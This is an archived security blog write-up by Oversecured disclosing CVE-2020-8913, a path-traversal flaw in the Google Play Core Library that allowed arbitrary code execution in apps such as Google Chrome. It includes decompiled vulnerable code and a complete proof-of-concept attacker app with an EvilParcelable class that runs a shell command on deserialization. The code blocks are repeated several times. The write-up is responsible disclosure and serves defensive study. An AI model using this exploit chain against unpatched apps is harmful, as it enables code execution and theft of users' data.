---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-28_oversecured-automatically-discovers-persistent-code-execution-in-the-google-play.md
original_filename: 2020-08-28_oversecured-automatically-discovers-persistent-code-execution-in-the-google-play.md
title: Oversecured automatically discovers persistent code execution in the Google
  Play Core Library
category: documents
detected_topics:
- mobile-security
- supply-chain
- sso
- command-injection
- path-traversal
- graphql
tags:
- imported
- documents
- mobile-security
- supply-chain
- sso
- command-injection
- path-traversal
- graphql
language: en
raw_sha256: 8760fd7616e00385dafa09368c63d8e622a0299aa7800461125c4e9dd645b59d
text_sha256: bce0fb8b02fde2bb6781ea1e22545510c8213b2470375c7a8f80d20f4735a7f9
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Oversecured automatically discovers persistent code execution in the Google Play Core Library

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-28_oversecured-automatically-discovers-persistent-code-execution-in-the-google-play.md
- Source Type: markdown
- Detected Topics: mobile-security, supply-chain, sso, command-injection, path-traversal, graphql
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `8760fd7616e00385dafa09368c63d8e622a0299aa7800461125c4e9dd645b59d`
- Text SHA256: `bce0fb8b02fde2bb6781ea1e22545510c8213b2470375c7a8f80d20f4735a7f9`


## Content

---
title: "Oversecured automatically discovers persistent code execution in the Google Play Core Library"
page_title: "Oversecured automatically discovers persistent code execution in the Google Play Core Library | Oversecured Blog"
url: "https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/"
final_url: "https://oversecured.com/blog/oversecured-automatically-discovers-persistent-code-execution-in-the-google-play-core-library"
authors: ["Oversecured (@OversecuredInc)"]
programs: ["Google"]
bugs: ["Arbitrary Code Execution", "Android"]
publication_date: "2020-08-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4289
---

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

Dast is live! 

[Learn more →](../dast)

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

[](../)

[BLOG](../blog)

[Case studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

solutions

[Sign in](https://app.oversecured.com/sign-in)

Contact us

[](../)

[](../)

No headings found on page

Aug 28, 2020

Research

###### Oversecured automatically discovers persistent code execution in the Google Play Core Library

###### Oversecured automatically discovers persistent code execution in the Google Play Core Library

![](https://framerusercontent.com/images/0tDYIMz67SvN5vReTM4yZ21Z7WU.png?width=2048&height=1194)

The Google Play Core Library is a popular library for Android that allows updates to various parts of an app to be delivered at runtime without the participation of the user, via the Google API. It can also be used to reduce the size of the main apk file by loading resources optimized for a particular device and settings (localization, image dimensions, processor architecture, dynamic modules) instead of storing dozens of different possible versions. The vulnerability we discovered made it possible to add executable modules to any apps using the library, meaning arbitrary code could be executed within them. An attacker who had a malware app installed on the victim’s device could steal users’ login details, passwords, and financial details, and read their mail.

Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2-week trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## Introduction

Experts at Oversecured’s scanning kernel development department tested an update on several popular apps and discovered that something interesting had triggered the scanner. In many cases, we uncovered [Theft of arbitrary files](https://app.oversecured.com/vulnerabilities#Theft_of_arbitrary_files) and [Overwriting arbitrary files ](https://app.oversecured.com/vulnerabilities#Overwriting_arbitrary_files)vulnerabilities in the Google Play Core library’s source code. Below we present a listing of the vulnerability from the report:

![](https://framerusercontent.com/images/HqQDP0mM7fL4s6Y5s81NmwB1mpY.png?width=2186&height=11362)

An exploit was written to steal arbitrary files, and a draft report was written to send to Google. Subsequently, the scope for developing the attack was investigated. As a result, the updated exploit made it possible to substitute executable files and achieve the execution of arbitrary code. The testing took place on the Google Chrome app.

## Fragment of the vulnerable code

The Google Chrome app was decompiled with the deobfuscation option set, and fragments of the resulting code are presented below.

An unprotected broadcast receiver in the file `com/google/android/play/core/splitinstall/C3748l.java` allows third-party apps to send specially crafted intents into it, forcing a vulnerable app to copy arbitrary files to arbitrary locations specified in the parameter `split_id` which is vulnerable to path-traversal.

Registration of the unprotected broadcast receiver in the file `com/google/android/play/core/splitinstall/C3748l.java`
  
  
  private C3748l(Context context, C3741e eVar) {
  super(new ae("SplitInstallListenerRegistry"), new IntentFilter("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService"), context);
  
  
  private C3748l(Context context, C3741e eVar) {
  super(new ae("SplitInstallListenerRegistry"), new IntentFilter("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService"), context);
  
  
  private C3748l(Context context, C3741e eVar) {
  super(new ae("SplitInstallListenerRegistry"), new IntentFilter("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService"), context);

File `com/google/android/play/core/listener/C3718a.java`
  
  
  protected C3718a(ae aeVar, IntentFilter intentFilter, Context context) {
  this.f22595a = aeVar;
  this.f22596b = intentFilter; // intent filter with action `com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService`
  this.f22597c = context;
  }
  
  private final void m15347a() {
  if ((this.f22600f || !this.f22598d.isEmpty()) && this.f22599e == null) {
  this.f22599e = new C3719b(this, 0);
  this.f22597c.registerReceiver(this.f22599e, this.f22596b); // registration of unprotected broadcast receiver
  
  
  protected C3718a(ae aeVar, IntentFilter intentFilter, Context context) {
  this.f22595a = aeVar;
  this.f22596b = intentFilter; // intent filter with action `com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService`
  this.f22597c = context;
  }
  
  private final void m15347a() {
  if ((this.f22600f || !this.f22598d.isEmpty()) && this.f22599e == null) {
  this.f22599e = new C3719b(this, 0);
  this.f22597c.registerReceiver(this.f22599e, this.f22596b); // registration of unprotected broadcast receiver
  
  
  protected C3718a(ae aeVar, IntentFilter intentFilter, Context context) {
  this.f22595a = aeVar;
  this.f22596b = intentFilter; // intent filter with action `com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService`
  this.f22597c = context;
  }
  
  private final void m15347a() {
  if ((this.f22600f || !this.f22598d.isEmpty()) && this.f22599e == null) {
  this.f22599e = new C3719b(this, 0);
  this.f22597c.registerReceiver(this.f22599e, this.f22596b); // registration of unprotected broadcast receiver

allows third-party apps installed on the same device to broadcast arbitrary data here.

The file `com/google/android/play/core/splitinstall/SplitInstallSessionState.java` processes the message received
  
  
  public static SplitInstallSessionState m15407a(Bundle bundle) {
  return new SplitInstallSessionState(bundle.getInt("session_id"), bundle.getInt("status"), bundle.getInt("error_code"), bundle.getLong("bytes_downloaded"), bundle.getLong("total_bytes_to_download"), bundle.getStringArrayList("module_names"), bundle.getStringArrayList("languages"), (PendingIntent) bundle.getParcelable("user_confirmation_intent"), bundle.getParcelableArrayList("split_file_intents")); // `split_file_intents` will be parsed
  }
  
  
  public static SplitInstallSessionState m15407a(Bundle bundle) {
  return new SplitInstallSessionState(bundle.getInt("session_id"), bundle.getInt("status"), bundle.getInt("error_code"), bundle.getLong("bytes_downloaded"), bundle.getLong("total_bytes_to_download"), bundle.getStringArrayList("module_names"), bundle.getStringArrayList("languages"), (PendingIntent) bundle.getParcelable("user_confirmation_intent"), bundle.getParcelableArrayList("split_file_intents")); // `split_file_intents` will be parsed
  }
  
  
  public static SplitInstallSessionState m15407a(Bundle bundle) {
  return new SplitInstallSessionState(bundle.getInt("session_id"), bundle.getInt("status"), bundle.getInt("error_code"), bundle.getLong("bytes_downloaded"), bundle.getLong("total_bytes_to_download"), bundle.getStringArrayList("module_names"), bundle.getStringArrayList("languages"), (PendingIntent) bundle.getParcelable("user_confirmation_intent"), bundle.getParcelableArrayList("split_file_intents")); // `split_file_intents` will be parsed
  }

In the file `com/google/android/play/core/internal/ab.java` the library copies content from the URI from `split_file_intents` into the `unverified-splits` directory under the name `split_id`, which is subject to path-traversal due to the absence of validation
  
  
  for (Intent next : list) {
  String stringExtra = next.getStringExtra("split_id");
  File a = this.f22543b.mo32067a(stringExtra); // path traversal from `/data/user/0/{package_name}/files/splitcompat/{id}/unverified-splits/`
  if (!a.exists() && !this.f22543b.mo32067b(stringExtra).exists()) {
  bufferedInputStream = new BufferedInputStream(new FileInputStream(this.f21840a.getContentResolver().openFileDescriptor(next.getData(), "r").getFileDescriptor())); // data of `split_file_intents` intents
  fileOutputStream = new FileOutputStream(a);
  byte[] bArr = new byte[4096];
  while (true) {
  int read = bufferedInputStream.read(bArr);
  if (read <= 0) {
  break;
  }
  fileOutputStream.write(bArr, 0, read);
  
  
  for (Intent next : list) {
  String stringExtra = next.getStringExtra("split_id");
  File a = this.f22543b.mo32067a(stringExtra); // path traversal from `/data/user/0/{package_name}/files/splitcompat/{id}/unverified-splits/`
  if (!a.exists() && !this.f22543b.mo32067b(stringExtra).exists()) {
  bufferedInputStream = new BufferedInputStream(new FileInputStream(this.f21840a.getContentResolver().openFileDescriptor(next.getData(), "r").getFileDescriptor())); // data of `split_file_intents` intents
  fileOutputStream = new FileOutputStream(a);
  byte[] bArr = new byte[4096];
  while (true) {
  int read = bufferedInputStream.read(bArr);
  if (read <= 0) {
  break;
  }
  fileOutputStream.write(bArr, 0, read);
  
  
  for (Intent next : list) {
  String stringExtra = next.getStringExtra("split_id");
  File a = this.f22543b.mo32067a(stringExtra); // path traversal from `/data/user/0/{package_name}/files/splitcompat/{id}/unverified-splits/`
  if (!a.exists() && !this.f22543b.mo32067b(stringExtra).exists()) {
  bufferedInputStream = new BufferedInputStream(new FileInputStream(this.f21840a.getContentResolver().openFileDescriptor(next.getData(), "r").getFileDescriptor())); // data of `split_file_intents` intents
  fileOutputStream = new FileOutputStream(a);
  byte[] bArr = new byte[4096];
  while (true) {
  int read = bufferedInputStream.read(bArr);
  if (read <= 0) {
  break;
  }
  fileOutputStream.write(bArr, 0, read);

After further careful research, it emerged that the `verified-splits`folder contains verified apks with the current app’s signature, which are no longer verified in the future. When a file in that folder starts with a `config.` prefix, it will be added to the app’s runtime ClassLoader automatically. Using that weakness, the attacker can create a class implementing e.g. the `Parcelable` interface and containing malicious code and send their instances to the affected app, meaning the `createFromParcel()` method will be executed in their context during deserialization leading to local code execution.

### Proof of Concept

A Proof of Concept was created for the Google Chrome app: it executes the command `chmod -R 777 /data/user/0/com.android.chrome` in the context of the vulnerable app. It first launches the app’s main activity, as a result of which an unprotected receiver is registered in the Google Play Core library code. 3 seconds later it sends a command to the receiver, which causes the affected app to be added in its entirety to the default ClassResolver. After 5 seconds the attacking app sends the `EvilParcelable` object, which automatically executes the command on being deserialized. Deserialization happens automatically, due to the way Android works. When a component receives an Intent, all attached objects are deserialized on receipt of a value or state (the `Intent.hasExtra(name)` method).
  
  
  public static final String APP = "com.android.chrome";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent launchIntent = getPackageManager().getLaunchIntentForPackage(APP);
  startActivity(launchIntent);
  
  new Handler().postDelayed(() -> {
  Intent split = new Intent();
  split.setData(Uri.parse("file://" + getApplicationInfo().sourceDir));
  split.putExtra("split_id", "../verified-splits/config.test");
  
  Bundle bundle = new Bundle();
  bundle.putInt("status", 3);
  bundle.putParcelableArrayList("split_file_intents", new ArrayList<Parcelable>(Arrays.asList(split)));
  
  Intent intent = new Intent("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService");
  intent.setPackage(APP);
  intent.putExtra("session_state", bundle);
  sendBroadcast(intent);
  }, 3000);
  
  new Handler().postDelayed(() -> {
  startActivity(launchIntent.putExtra("x", new EvilParcelable()));
  }, 5000);
  }
  
  
  public static final String APP = "com.android.chrome";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent launchIntent = getPackageManager().getLaunchIntentForPackage(APP);
  startActivity(launchIntent);
  
  new Handler().postDelayed(() -> {
  Intent split = new Intent();
  split.setData(Uri.parse("file://" + getApplicationInfo().sourceDir));
  split.putExtra("split_id", "../verified-splits/config.test");
  
  Bundle bundle = new Bundle();
  bundle.putInt("status", 3);
  bundle.putParcelableArrayList("split_file_intents", new ArrayList<Parcelable>(Arrays.asList(split)));
  
  Intent intent = new Intent("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService");
  intent.setPackage(APP);
  intent.putExtra("session_state", bundle);
  sendBroadcast(intent);
  }, 3000);
  
  new Handler().postDelayed(() -> {
  startActivity(launchIntent.putExtra("x", new EvilParcelable()));
  }, 5000);
  }
  
  
  public static final String APP = "com.android.chrome";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent launchIntent = getPackageManager().getLaunchIntentForPackage(APP);
  startActivity(launchIntent);
  
  new Handler().postDelayed(() -> {
  Intent split = new Intent();
  split.setData(Uri.parse("file://" + getApplicationInfo().sourceDir));
  split.putExtra("split_id", "../verified-splits/config.test");
  
  Bundle bundle = new Bundle();
  bundle.putInt("status", 3);
  bundle.putParcelableArrayList("split_file_intents", new ArrayList<Parcelable>(Arrays.asList(split)));
  
  Intent intent = new Intent("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService");
  intent.setPackage(APP);
  intent.putExtra("session_state", bundle);
  sendBroadcast(intent);
  }, 3000);
  
  new Handler().postDelayed(() -> {
  startActivity(launchIntent.putExtra("x", new EvilParcelable()));
  }, 5000);
  }

Code for the class that executes the command under the attacker’s control on deserialization
  
  
  package oversecured.poc;
  
  import android.os.Parcelable;
  
  public class EvilParcelable implements Parcelable {
  public static final Parcelable.Creator<EvilParcelable> CREATOR = new Parcelable.Creator<EvilParcelable>() {
  public EvilParcelable createFromParcel(android.os.Parcel parcel) {
  exploit();
  return null;
  }
  
  public EvilParcelable[] newArray(int i) {
  exploit();
  return null;
  }
  
  private void exploit() {
  try {
  Runtime.getRuntime().exec("chmod -R 777 /data/user/0/" + MainActivity.APP).waitFor();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  };
  
  public int describeContents() { return 0; }
  public void writeToParcel(android.os.Parcel parcel, int i) {}
  }
  
  
  package oversecured.poc;
  
  import android.os.Parcelable;
  
  public class EvilParcelable implements Parcelable {
  public static final Parcelable.Creator<EvilParcelable> CREATOR = new Parcelable.Creator<EvilParcelable>() {
  public EvilParcelable createFromParcel(android.os.Parcel parcel) {
  exploit();
  return null;
  }
  
  public EvilParcelable[] newArray(int i) {
  exploit();
  return null;
  }
  
  private void exploit() {
  try {
  Runtime.getRuntime().exec("chmod -R 777 /data/user/0/" + MainActivity.APP).waitFor();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  };
  
  public int describeContents() { return 0; }
  public void writeToParcel(android.os.Parcel parcel, int i) {}
  }
  
  
  package oversecured.poc;
  
  import android.os.Parcelable;
  
  public class EvilParcelable implements Parcelable {
  public static final Parcelable.Creator<EvilParcelable> CREATOR = new Parcelable.Creator<EvilParcelable>() {
  public EvilParcelable createFromParcel(android.os.Parcel parcel) {
  exploit();
  return null;
  }
  
  public EvilParcelable[] newArray(int i) {
  exploit();
  return null;
  }
  
  private void exploit() {
  try {
  Runtime.getRuntime().exec("chmod -R 777 /data/user/0/" + MainActivity.APP).waitFor();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  };
  
  public int describeContents() { return 0; }
  public void writeToParcel(android.os.Parcel parcel, int i) {}
  }

## Conclusion

This vulnerability was assessed by Google as highly dangerous. It meant many popular apps, including Google Chrome, were vulnerable to arbitrary code execution. This could lead to leaks of users’ credentials and financial details, including credit card history; to interception and falsification of their browser history, cookie files, etc. To remove it, developers should update the Google Play Core library to the latest version and users should update all their apps.

### Timeline

02/26/2020 - Scanner triggered, first exploit to steal arbitrary files created  
02/27/2020 - Vulnerability studied in greater detail, exploit to execute arbitrary code created, information sent to Google  
04/06/2020 - Google confirmed the vulnerability has been fixed  
07/22/2020 - Google assigned CVE-2020-8913

##### Keep reading

[View all](../blog)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/3pdKQL7LiXMgBBDS1jzcalJrMnA.png?width=2048&height=1194)Android security checklist: theft of arbitrary filesDevelopers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. Android SecurityMay 20, 202211min readTOp article](./android-security-checklist-theft-of-arbitrary-files)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./oversecured-automatically-discovers-persistent-code-execution-in-the-google-play-core-library#header)

[](../)

[go up ↑](./oversecured-automatically-discovers-persistent-code-execution-in-the-google-play-core-library#header)

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

2026 © Oversecured

[Blog](../blog)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

[Case Studies](https://oversecured.com/blog?category=case-study)

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./oversecured-automatically-discovers-persistent-code-execution-in-the-google-play-core-library#header)
